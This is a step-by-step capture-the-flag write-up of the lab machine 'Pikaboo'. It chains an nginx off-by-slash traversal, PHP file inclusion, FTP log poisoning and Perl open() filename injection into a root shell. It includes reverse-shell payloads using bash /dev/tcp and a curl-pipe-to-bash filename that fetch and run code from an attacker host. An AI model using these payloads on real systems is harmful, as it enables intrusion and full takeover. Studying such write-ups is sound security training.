<h2 id="phase-0-before-starting">Phase 0: Before Starting</h2>
<p>Pikaboo chains several small findings, with each result defining the next test.</p>
<ol>
<li><strong>Enumerate everything</strong> : services, versions, headers, error messages, file paths.</li>
<li><strong>Question anomalies</strong> : If something looks weird, investigate it. Weird is where bugs live.</li>
<li><strong>Abuse trust boundaries</strong> : Reverse proxies, cronjobs, and scripts that run with higher privileges are your friends.</li>
<li><strong>Review the implementation</strong> : How would YOU build this? What shortcuts would you take? Where would you mess up?</li>
</ol>
<p>On Pikaboo, the entire chain starts with one weird detail: the error page says "Apache on 127.0.0.1:81" but Nmap says nginx. That mismatch is our first dot.</p>

<h2 id="phase-1-enumeration-mapping-the-attack-surface">Phase 1: Enumeration: Mapping the Attack Surface</h2>
<h3 id="step-1-1-full-port-scan">Step 1.1: Full Port Scan</h3>
<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.95.191
</code></pre>
<p><strong>Why this command?</strong></p>
<ul>
<li><code>-p-</code> scans all 65,535 TCP ports. We don't assume only "common" ports are open.</li>
<li><code>--min-rate 10000</code> sends packets fast. We want speed; we're on a CTF timer (or just impatient).</li>
</ul>
<p> If you only scan top 1000 ports, you miss custom services. Admins hide SSH on port 2222, HTTP on 8080, etc. scan everything.</p>
<p><strong>Result:</strong> Only 3 ports open:</p>
<ul>
<li><code>21/tcp</code> : FTP (vsftpd 3.0.3)</li>
<li><code>22/tcp</code> : SSH (OpenSSH 7.9p1 Debian 10)</li>
<li><code>80/tcp</code> : HTTP (nginx 1.14.2)</li>
</ul>
<h3 id="step-1-2-service-version-scan">Step 1.2: Service Version Scan</h3>
<pre tabindex="0" aria-label="bash code or terminal block 2"><code class="language-bash" data-language="bash">nmap -p 21,22,80 -sCV 10.129.95.191
</code></pre>
<p><strong>Why this command?</strong></p>
<ul>
<li><code>-sC</code> runs default NSE scripts (gives us FTP anon check, HTTP title, SSH hostkeys).</li>
<li><code>-sV</code> fingerprints versions. Specific versions have known exploits.</li>
</ul>
<p> Version numbers tell a story. OpenSSH 7.9p1 on Debian 10 means this is a Buster box. vsftpd 3.0.3 has no public RCE, but we note it. nginx 1.14.2 is old - worth checking for misconfigurations.</p>
<p><strong>Result:</strong> Nothing immediately exploitable. FTP doesn't allow anonymous login. SSH is patched. nginx is old but not publicly vulnerable.</p>
<p><strong>What do we do now?</strong> We dig into the web application. The real attack surface is rarely the service itself - it's how the service is configured.</p>

<h2 id="phase-2-the-web-finding-the-nginx-misconfiguration">Phase 2: The Web: Finding the Nginx Misconfiguration</h2>
<h3 id="step-2-1-browse-the-website">Step 2.1: Browse the Website</h3>
<p>Visit <code>http://10.129.95.191/</code>. We see a "Pikaboo" Pokemon clone site with three links:</p>
<ul>
<li><code>/pokatdex.php</code> : Monster gallery</li>
<li><code>/contact.php</code> : A contact form (button doesn't work)</li>
<li><code>/admin</code> : HTTP Basic Authentication popup</li>
</ul>
<p> Every endpoint is a clue. The <code>.php</code> extensions tell us this is a PHP application. The <code>/admin</code> endpoint with basic auth is interesting - not because we can guess the password (we can't), but because of what happens when we <strong>fail</strong> to authenticate.</p>
<h3 id="step-2-2-click-cancel-on-the-auth-dialog">Step 2.2: Click "Cancel" on the Auth Dialog</h3>
<p>When you hit Cancel on the <code>/admin</code> basic auth, you get an error page. Read it carefully.</p>
<p><strong>What does it say?</strong></p>
<blockquote>
<p>"Unauthorized. This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn't understand how to supply the credentials required. Additionally, a 401 Unauthorized error was encountered while trying to use an ErrorDocument to handle the request. <strong>Apache/2.4.38 (Debian) Server at 127.0.0.1:81 Port 81</strong>"</p>
</blockquote>
<p><strong>What the response reveals:</strong></p>
<p>We have a <strong>major architectural mismatch</strong>:</p>
<ul>
<li>Nmap says port 80 is <strong>nginx</strong>.</li>
<li>The error says <strong>Apache on 127.0.0.1:81</strong>.</li>
</ul>
<p>This means: <strong>nginx is a reverse proxy</strong>, forwarding requests to Apache running locally on port 81. This is a common setup, but reverse proxies are where misconfigurations hide. When two web servers parse the same URL differently, you get parser differential attacks.</p>
<p><strong>Key questions to ask:</strong></p>
<ol>
<li>How does nginx decide what to forward to Apache?</li>
<li>What happens if we send nginx a URL that Apache interprets differently?</li>
<li>Are there any <code>location</code> blocks in nginx that might be misconfigured?</li>
</ol>

<h2 id="phase-3-off-by-slash-understanding-the-vulnerability">Phase 3: Off-By-Slash: Understanding the Vulnerability</h2>
<h3 id="step-3-1-what-is-off-by-slash">Step 3.1: What is Off-By-Slash?</h3>
<p>This is a classic nginx misconfiguration discovered by Orange Tsai. It happens when an nginx config looks like this:</p>
<pre tabindex="0" aria-label="nginx code or terminal block 3"><code class="language-nginx" data-language="nginx">location /admin {
    proxy_pass http://127.0.0.1:81/;
}
</code></pre>
<p>Notice: <code>location /admin</code> has <strong>no trailing slash</strong>, but <code>proxy_pass</code> has a <strong>trailing slash</strong>.</p>
<p><strong>Why does this matter?</strong></p>
<p>When you visit <code>/admin</code>, nginx forwards to <code>http://127.0.0.1:81/</code>. That's fine.</p>
<p>When you visit <code>/adminnew</code>, nginx still matches <code>/admin</code> (because <code>/admin</code> is a prefix match without a trailing slash). It forwards to <code>http://127.0.0.1:81/new</code>. The writeup noted that <code>/adminnew</code> returned 401, proving the prefix match.</p>
<p>But what about <code>/admin../</code>?</p>
<p>Nginx sees <code>/admin</code> as the matched prefix, strips it, and forwards the rest (<code>../</code>) to Apache. So <code>/admin../something</code> becomes <code>http://127.0.0.1:81/../something</code>.</p>
<p>Apache then normalizes <code>../</code> and traverses up a directory!</p>
<p> This is parser differential logic. Nginx and Apache disagree on what the URL means. Nginx thinks "strip <code>/admin</code>, forward the rest." Apache thinks "oh, <code>../</code>? Let me go up a directory." We abuse this disagreement.</p>
<h3 id="step-3-2-testing-the-theory">Step 3.2: Testing the Theory</h3>
<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash">curl -I http://10.129.95.191/admin../server-status
</code></pre>
<p><strong>Why <code>server-status</code>?</strong></p>
<ul>
<li>Apache's <code>server-status</code> page is usually restricted to localhost.</li>
<li>But our request IS coming from localhost - because nginx proxies it.</li>
</ul>
<p><strong>Result:</strong> <code>HTTP/1.1 200 OK</code></p>
<p>We just accessed Apache's <code>server-status</code> from the internet by abusing the off-by-slash. This confirms the vulnerability.</p>
<h3 id="step-3-3-finding-the-hidden-admin-panel">Step 3.3: Finding the Hidden Admin Panel</h3>
<p>Looking at <code>server-status</code>, we see requests to <code>/admin_staging</code>. This is a hidden staging area.</p>
<pre tabindex="0" aria-label="bash code or terminal block 5"><code class="language-bash" data-language="bash">curl -I http://10.129.95.191/admin../admin_staging/
</code></pre>
<p><strong>Result:</strong> <code>HTTP/1.1 200 OK</code></p>
<p>We now have access to an admin dashboard that was never meant to be public.</p>
<p> Check <code>server-status</code> when you find Apache behind a proxy. It's a useful source of internal URLs, IPs, and request patterns. Even if you can't exploit it directly, it tells you what exists.</p>

<h2 id="phase-4-lfi-turning-a-page-parameter-into-file-reading">Phase 4: LFI: Turning a Page Parameter into File Reading</h2>
<h3 id="step-4-1-spotting-the-lfi-pattern">Step 4.1: Spotting the LFI Pattern</h3>
<p>In the staging panel, clicking "User Profile" loads:</p>
<pre tabindex="0" aria-label="Code or terminal block 6"><code>http://10.129.95.191/admin../admin_staging/index.php?page=user.php
</code></pre>
<p> The <code>?page=</code> parameter is screaming "file inclusion." This is a very common PHP anti-pattern. The code probably looks like:</p>
<pre tabindex="0" aria-label="php code or terminal block 7"><code class="language-php" data-language="php">include($_GET['page']);
</code></pre>
<p>Or slightly better:</p>
<pre tabindex="0" aria-label="php code or terminal block 8"><code class="language-php" data-language="php">include($_GET['page'] . '.php');
</code></pre>
<p>But since the URL already has <code>.php</code> on the end (<code>page=user.php</code>), the developer is likely just doing <code>include($_GET['page'])</code> directly. This means we might be able to include <strong>any file</strong>, not just PHP files.</p>
<h3 id="step-4-2-testing-lfi">Step 4.2: Testing LFI</h3>
<p>First, try the obvious:</p>
<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash">curl http://10.129.95.191/admin../admin_staging/index.php?page=/etc/passwd
</code></pre>
<p><strong>Result:</strong> Fails. No output.</p>
<p> Don't give up on the first failure. LFI restrictions are common. Maybe:</p>
<ul>
<li>The path is prefixed (e.g., <code>/var/www/html/pages/</code> + our input)</li>
<li>There's a suffix (e.g., our input + <code>.php</code>)</li>
<li>There's a path traversal limit</li>
<li>The web server doesn't have read permissions on <code>/etc/passwd</code></li>
</ul>
<p>Try local files first:</p>
<pre tabindex="0" aria-label="bash code or terminal block 10"><code class="language-bash" data-language="bash">curl http://10.129.95.191/admin../admin_staging/index.php?page=contact.php
</code></pre>
<p><strong>Result:</strong> The contact page content appears inside the dashboard. LFI confirmed.</p>
<p>Try going up directories:</p>
<pre tabindex="0" aria-label="bash code or terminal block 11"><code class="language-bash" data-language="bash">curl http://10.129.95.191/admin../admin_staging/index.php?page=../../../var/log/dpkg.log
</code></pre>
<p><strong>Result:</strong> We can read <code>/var/log/dpkg.log</code>. So we can read <code>/var/log/*</code> but not <code>/etc/*</code>.</p>
<p><strong>Why?</strong> The web server likely runs in a directory like <code>/var/www/html/admin_staging/</code>. Going up 3 levels gets us to <code>/var/</code>, and from there we can reach <code>log/</code>. But <code>/etc/</code> is too far or blocked by permissions.</p>
<p> When <code>/etc/passwd</code> fails, ask "what CAN I read?" Log files, config files in <code>/var/</code>, application files - anything readable is useful. On this box, the Finding is <code>/var/log/vsftpd.log</code> because we know FTP is running and logging.</p>
<h3 id="step-4-3-confirming-the-log-file">Step 4.3: Confirming the Log File</h3>
<pre tabindex="0" aria-label="bash code or terminal block 12"><code class="language-bash" data-language="bash">curl http://10.129.95.191/admin../admin_staging/index.php?page=/var/log/vsftpd.log
</code></pre>
<p><strong>Result:</strong> We see FTP connection logs, including usernames from failed login attempts.</p>
<p> This is the bridge to code execution. If we can write PHP code into a file that gets <code>include()</code>'d, the PHP engine will execute it. Logs are perfect because:</p>
<ol>
<li>We control the input (the FTP username is logged verbatim).</li>
<li>The log file is readable by the web server.</li>
<li>The LFI includes the log file as PHP code, not as text.</li>
</ol>
<hr>
<h2 id="phase-5-ftp-log-poisoning-getting-code-execution">Phase 5: FTP Log Poisoning: Getting Code Execution</h2>
<h3 id="step-5-1-how-log-poisoning-works">Step 5.1: How Log Poisoning Works</h3>
<p>PHP's <code>include()</code> function doesn't just dump file contents - it <strong>executes PHP code</strong> inside the included file. So if <code>/var/log/vsftpd.log</code> contains:</p>
<pre tabindex="0" aria-label="Code or terminal block 13"><code>Thu Jul 8 17:17:47 2021 [pid 14106] FTP command: Client "::ffff:10.10.14.6", "USER &lt;?php system('id'); ?&gt;"
</code></pre>
<p>When PHP includes this log file, it sees <code>&lt;?php system('id'); ?&gt;</code> and <strong>executes it</strong>. The rest of the log text is just treated as HTML.</p>
<p> Log poisoning is one of the oldest tricks in the book, but it requires three conditions:</p>
<ol>
<li>You can write arbitrary text into a log (controlled input).</li>
<li>The log file is readable via LFI.</li>
<li>The included file is processed by PHP (not just echoed as text).</li>
</ol>
<p>On this box, all three conditions are met perfectly.</p>
<h3 id="step-5-2-testing-code-execution">Step 5.2: Testing Code Execution</h3>
<pre tabindex="0" aria-label="bash code or terminal block 14"><code class="language-bash" data-language="bash">ftp 10.129.95.191
Name: &lt;?php system('id'); ?&gt;
Password: REDACTED
</code></pre>
<p>Then trigger the LFI:</p>
<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">curl http://10.129.95.191/admin../admin_staging/index.php?page=/var/log/vsftpd.log
</code></pre>
<p><strong>Result:</strong> The page contains <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>.</p>
<p><strong>We have code execution.</strong></p>
<hr>
<h2 id="phase-6-shell-as-www-data">Phase 6: Shell as www-data</h2>
<h3 id="step-6-1-upgrading-from-code-execution-to-a-shell">Step 6.1: Upgrading from Code Execution to a Shell</h3>
<p>Code execution is nice, but a real shell is better. We need a reverse shell payload that:</p>
<ol>
<li>Works in PHP's <code>system()</code>.</li>
<li>Doesn't get mangled by the FTP client or log format.</li>
<li>Connects back to our attacker machine.</li>
</ol>
<p><strong>Payload:</strong></p>
<pre tabindex="0" aria-label="php code or terminal block 16"><code class="language-php" data-language="php">&lt;?php system('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1"'); ?&gt;
</code></pre>
<p><strong>Why this payload?</strong></p>
<ul>
<li><code>bash -c "bash -i ..."</code> ensures we get an interactive bash shell.</li>
<li><code>/dev/tcp/</code> is a bash builtin for TCP connections - no external tools needed.</li>
<li><code>0&gt;&amp;1</code> redirects stdin to the same socket, giving us a full duplex connection.</li>
</ul>
<p><strong>Steps:</strong></p>
<ol>
<li>Start listener: <code>nc -lnvp 443</code></li>
<li>FTP login with the PHP payload as username.</li>
<li>Curl the LFI URL to trigger execution.</li>
<li>Catch the shell.</li>
</ol>
<h3 id="step-6-2-upgrading-the-tty">Step 6.2: Upgrading the TTY</h3>
<p>The initial shell is janky - no tab completion, no history, Ctrl+C kills it. Fix it:</p>
<pre tabindex="0" aria-label="bash code or terminal block 17"><code class="language-bash" data-language="bash">python3 -c 'import pty;pty.spawn("bash")'
</code></pre>
<p>Then press <code>Ctrl+Z</code> to background nc. In your Kali terminal:</p>
<pre tabindex="0" aria-label="bash code or terminal block 18"><code class="language-bash" data-language="bash">stty raw -echo; fg
</code></pre>
<p>Then type <code>reset</code> and set terminal to <code>xterm</code>.</p>
<p><strong>Why do this?</strong> A proper TTY lets you use <code>su</code>, <code>nano</code>, <code>vim</code>, and handle interactive programs. Without it, many commands break.</p>

</code></pre>

<h2 id="phase-7-privilege-escalation-enumeration">Phase 7: Privilege Escalation Enumeration</h2>
<h3 id="step-7-1-check-cronjobs">Step 7.1: Check Cronjobs</h3>
<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash">cat /etc/crontab
</code></pre>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 21"><code>* * * * * root /usr/local/bin/csvupdate_cron
</code></pre>
<p>A script running as <strong>root every single minute</strong>.</p>
<p> Cronjobs are privilege escalation heaven. Any script running as root that we can influence is a direct path to root. Check <code>/etc/crontab</code>, <code>/etc/cron.d/</code>, and user crontabs.</p>
<h3 id="step-7-2-analyze-the-cron-script">Step 7.2: Analyze the Cron Script</h3>
<pre tabindex="0" aria-label="bash code or terminal block 22"><code class="language-bash" data-language="bash">cat /usr/local/bin/csvupdate_cron
</code></pre>
<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">#!/bin/bash
for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
</code></pre>
<p><strong>What does this do?</strong></p>
<ol>
<li>Loops over every directory in <code>/srv/ftp/</code>.</li>
<li><code>cd</code>s into each one.</li>
<li>Runs <code>/usr/local/bin/csvupdate [directory_name] *csv</code>.</li>
<li>Deletes everything in the directory.</li>
</ol>
<p><strong>Why is this suspicious?</strong></p>
<ul>
<li>It runs as root.</li>
<li>It processes user-controlled files (<code>*csv</code> wildcard expansion).</li>
<li>It calls another script (<code>csvupdate</code>) which we need to inspect.</li>
</ul>
<h3 id="step-7-3-analyze-csvupdate">Step 7.3: Analyze csvupdate</h3>
<pre tabindex="0" aria-label="bash code or terminal block 24"><code class="language-bash" data-language="bash">file /usr/local/bin/csvupdate
head -n 30 /usr/local/bin/csvupdate
</code></pre>
<p>It's a <strong>Perl script</strong>. The critical part is at the end:</p>
<pre tabindex="0" aria-label="perl code or terminal block 25"><code class="language-perl" data-language="perl">shift;
for(&lt;&gt;)
{
  chomp;
  if($csv-&gt;parse($_))
  {
    my @fields = $csv-&gt;fields();
    if(@fields != $csv_fields{$type})
    {
      warn "Incorrect number of fields: '$_'\n";
      next;
    }
    print $fh "$_\n";
  }
}
</code></pre>
<p> The <code>for(&lt;&gt;)</code> loop in Perl is extremely dangerous when <code>@ARGV</code> contains user-controlled filenames. Perl's <code>open()</code> function has a "feature":</p>
<ul>
<li>If a filename starts with <code>|</code>, it's treated as a command to execute.</li>
<li>If a filename ends with <code>|</code>, the output of the command is read.</li>
</ul>
<p>This means if we can create a file named <code>|id</code>, Perl will execute <code>id</code> when it tries to open it.</p>
<p><strong>But there's a catch:</strong> We don't have FTP access yet. The <code>/srv/ftp/*</code> directories are owned by <code>root:ftp</code> with permissions <code>drwx-wx---</code>. Only root and the <code>ftp</code> group can write to them. We need to find a way in.</p>

<h2 id="phase-8-ldap-finding-hidden-credentials">Phase 8: LDAP: Finding Hidden Credentials</h2>
<h3 id="step-8-1-find-the-config-file">Step 8.1: Find the Config File</h3>
<p>While enumerating as <code>www-data</code>, we find <code>/opt/pokeapi/</code>. This is the "under construction" API mentioned on the main site. Inside:</p>
<pre tabindex="0" aria-label="bash code or terminal block 26"><code class="language-bash" data-language="bash">cat /opt/pokeapi/config/settings.py
</code></pre>
<p><strong>Finding:</strong></p>
<pre tabindex="0" aria-label="python code or terminal block 27"><code class="language-python" data-language="python">DATABASES = {

<p> Developers hardcode credentials. grep for <code>password</code>, <code>passwd</code>, <code>secret</code>, <code>key</code> in config files. Django apps, WordPress configs, <code>.env</code> files - they're all credential stores.</p>
<h3 id="step-8-2-enumerate-ldap">Step 8.2: Enumerate LDAP</h3>
<p>LDAP is running on <code>127.0.0.1:389</code>. We have valid bind credentials. Dump everything:</p>

<pre tabindex="0" aria-label="Code or terminal block 29"><code>userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
</code></pre>
<h3 id="step-8-3-decode-the-password">Step 8.3: Decode the Password</h3>
<pre tabindex="0" aria-label="bash code or terminal block 30"><code class="language-bash" data-language="bash">echo "X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==" | base64 -d
</code></pre>
<p><strong>Result:</strong> <code>_G0tT4_C4tcH_'3m_4lL!_</code></p>
<p> Base64 is not encryption. It's encoding. Do not assume <code>userPassword::</code> means it's hashed. try <code>base64 -d</code> first.</p>
<h3 id="step-8-4-test-ftp-access">Step 8.4: Test FTP Access</h3>
<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">ftp 10.129.95.191
Name: pwnmeow
Password: REDACTED
</code></pre>
<p><strong>Result:</strong> Login successful. We now have write access to <code>/srv/ftp/*</code> directories.</p>
<hr>
<h2 id="phase-9-perl-open-injection-the-root-path">Phase 9: Perl Open() Injection: The Root Path</h2>
<h3 id="step-9-1-understanding-the-vulnerability">Step 9.1: Understanding the Vulnerability</h3>
<p>Perl's <code>open()</code> function is ancient and dangerous. When you do:</p>
<pre tabindex="0" aria-label="perl code or terminal block 32"><code class="language-perl" data-language="perl">open(my $fh, "&gt;&gt;", $filename)
</code></pre>
<p>Perl checks if <code>$filename</code> starts with <code>|</code>. If so, instead of opening a file, it <strong>executes the rest as a shell command</strong>.</p>
<p>In our case, the Perl script does <code>for(&lt;&gt;)</code>, which implicitly calls <code>open()</code> on every element in <code>@ARGV</code>. The <code>@ARGV</code> comes from the bash wildcard <code>*csv</code>.</p>
<p><strong>The exploit chain:</strong></p>
<ol>
<li>We upload a file with a name starting with <code>|</code>.</li>
<li>The cron runs: <code>csvupdate types *csv</code>.</li>
<li>Bash expands <code>*csv</code> to our malicious filename.</li>
<li>Perl's <code>for(&lt;&gt;)</code> tries to "open" it.</li>
<li>The command executes as <strong>root</strong>.</li>
</ol>
<h3 id="step-9-2-the-filename-challenge">Step 9.2: The Filename Challenge</h3>
<p>Here's the problem: <strong>we cannot use <code>/</code> in our payload</strong>.</p>
<p>Why? Because <code>/</code> is a directory separator in Linux. You cannot create a file named <code>bash -c "bash -i &gt;&amp; /dev/tcp/..."</code> because the <code>/</code> characters would be interpreted as directory paths.</p>
<p> When you hit a restriction, find a way around it. We need a reverse shell without using <code>/</code> in the filename itself. The solution: <strong>let something else handle the <code>/</code> for us.</strong></p>
<p><strong>Solution 1: Use <code>curl</code></strong></p>
<ul>
<li>Filename: <code>|curl 10.10.16.84:9000|bash; a.csv</code></li>
<li>No <code>/</code> in the filename!</li>
<li>The <code>/</code> is only in the downloaded script, which is executed by <code>bash</code>.</li>
</ul>
<p><strong>Solution 2: Base64 encoding</strong></p>
<ul>
<li>Filename: <code>|echo &lt;base64&gt;|base64 -d|bash; a.csv</code></li>
<li>The base64 string contains no <code>/</code>.</li>
<li>When decoded, it produces the reverse shell with <code>/</code> characters.</li>
</ul>
<p>We used <strong>Solution 1</strong> because it's simpler to debug (you see the HTTP request hit your server).</p>
<h3 id="step-9-3-setting-up-the-attack">Step 9.3: Setting Up the Attack</h3>
<p><strong>Step 1 - Create the payload file on Kali:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 33"><code class="language-bash" data-language="bash">echo 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1' &gt; index.html
</code></pre>
<p><strong>Why <code>index.html</code>?</strong> When <code>curl</code> hits <code>http://10.10.16.84:9000</code> without a path, it requests <code>/</code> by default. Python's HTTP server will serve <code>index.html</code> for the root path.</p>
<p><strong>Step 2 - Start the HTTP server:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 34"><code class="language-bash" data-language="bash">python3 -m http.server 9000
</code></pre>
<p><strong>Step 3 - Start the reverse shell listener:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 35"><code class="language-bash" data-language="bash">nc -lnvp 4444
</code></pre>
<p><strong>Step 4 - Create a dummy local file for FTP:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 36"><code class="language-bash" data-language="bash">touch test.txt
</code></pre>
<p><strong>Why do we need <code>test.txt</code>?</strong> The <code>put</code> command requires a local file to upload. We don't care about its contents - only the remote filename matters.</p>
<p><strong>Step 5 - Upload the malicious file:</strong></p>
<pre tabindex="0" aria-label="bash code or terminal block 37"><code class="language-bash" data-language="bash">ftp 10.129.95.191
# login as pwnmeow
ftp&gt; cd types
ftp&gt; put test.txt "|curl 10.10.16.84:9000|bash; a.csv"
ftp&gt; quit
</code></pre>
<p><strong>Why <code>types</code>?</strong> The cron script does <code>$(basename $d)</code> where <code>$d</code> is the directory name. Perl checks if <code>types</code> exists in its <code>%csv_fields</code> hash. It does (value: 4). If we picked an invalid directory, Perl would die before reaching our file.</p>
<p><strong>Why does the filename end with <code>a.csv</code>?</strong> Because the bash glob <code>*csv</code> must match it. <code>a.csv</code> ends with <code>csv</code>, so it matches.</p>
<p><strong>Why the <code>;</code> before <code>a.csv</code>?</strong> It's a bash command separator. The actual command executed is:</p>
<pre tabindex="0" aria-label="bash code or terminal block 38"><code class="language-bash" data-language="bash">curl 10.10.16.84:9000 | bash
</code></pre>
<p>The <code>; a.csv</code> is just junk that bash ignores after the pipeline finishes.</p>
<h3 id="step-9-4-catching-root">Step 9.4: Catching Root</h3>
<p>Wait up to 60 seconds. The cron runs every minute.</p>
<p><strong>What happens:</strong></p>
<ol>
<li>Cron executes <code>csvupdate types *csv</code>.</li>
<li><code>*csv</code> expands to <code>|curl 10.10.16.84:9000|bash; a.csv</code>.</li>
<li>Perl's <code>for(&lt;&gt;)</code> calls <code>open()</code> on this filename.</li>
<li>Because it starts with <code>|</code>, Perl executes: <code>curl 10.10.16.84:9000 | bash</code>.</li>
<li><code>curl</code> downloads our <code>index.html</code> containing the reverse shell.</li>
<li><code>bash</code> executes it.</li>
<li>We get a root shell on <code>nc -lnvp 4444</code>.</li>
</ol>
<p><strong>Result:</strong></p>
<pre tabindex="0" aria-label="Code or terminal block 39"><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.95.191] 43726
root@pikaboo:/srv/ftp/types# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<h3 id="step-9-5-grab-root-flag">Step 9.5: Grab Root Flag</h3>
<pre tabindex="0" aria-label="bash code or terminal block 40"><code class="language-bash" data-language="bash">cat /root/root.txt
</code></pre>
<p><strong>Flag:</strong> <code>69b057[redacted]454314a</code></p>
<hr>
<h2 id="lessons-learned">Lessons Learned</h2>
<h3 id="technical-lessons">Technical Lessons</h3>
<ol>
<li><strong>Off-by-Slash:</strong> test for path traversal when you see nginx proxying to Apache. A missing <code>/</code> in a <code>location</code> block is catastrophic.</li>
<li><strong>LFI + Log Poisoning:</strong> If you can read logs and control input that goes into those logs, you have code execution.</li>
<li><strong>Perl <code>open()</code> injection:</strong> The diamond operator <code>&lt;&gt;</code> in Perl is dangerous with untrusted filenames. A leading <code>|</code> turns a file open into command execution.</li>
<li><strong>Hardcoded Credentials:</strong> Config files in <code>/opt/</code>, <code>/var/www/</code>, and application directories are prime targets for credential harvesting.</li>
</ol>
<h3 id="lessons">Lessons</h3>
<ol>
<li><strong>Anomalies are clues.</strong> The Apache/nginx mismatch was the first domino.</li>
<li><strong>Don't give up on the first failure.</strong> <code>/etc/passwd</code> didn't work for LFI, but <code>/var/log/vsftpd.log</code> did.</li>
<li><strong>Restrictions breed creativity.</strong> Not being able to use <code>/</code> forced us to use <code>curl</code> and a web server - a classic redirection attack.</li>
<li><strong>Chain everything.</strong> No single exploit owned this box. It took: nginx bypass → LFI → log poisoning → LDAP creds → FTP access → Perl injection.</li>
</ol>
